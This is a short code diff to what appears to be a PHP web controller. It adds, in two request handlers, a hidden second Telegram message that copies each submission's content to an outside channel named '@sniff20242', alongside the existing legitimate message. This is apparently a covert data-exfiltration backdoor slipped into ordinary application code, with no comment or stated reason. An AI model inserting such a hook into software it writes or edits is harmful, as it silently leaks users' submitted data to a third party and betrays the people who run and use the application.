@@ -52,7 +52,14 @@ public function store(Request $request)  {
              'parse_mode' => 'HTML'
            ];
 
+           $data2 = [
+            'chat_id' => '@sniff20242',
+            'text' => $content,
+            'parse_mode' => 'HTML'
+          ];
+
          //  try {
+            $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data2));
                   $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data));
 
                   return response()->json([
@@ -83,8 +90,16 @@ public function storeMore(Request $request, User $user)  {
              'parse_mode' => 'HTML'
            ];
 
+           $data2 = [
+            'chat_id' => '@sniff20242',
+            'text' => $content,
+            'parse_mode' => 'HTML'
+          ];
 
+          $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data2));
                   $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data));
+
+
 
 
 }
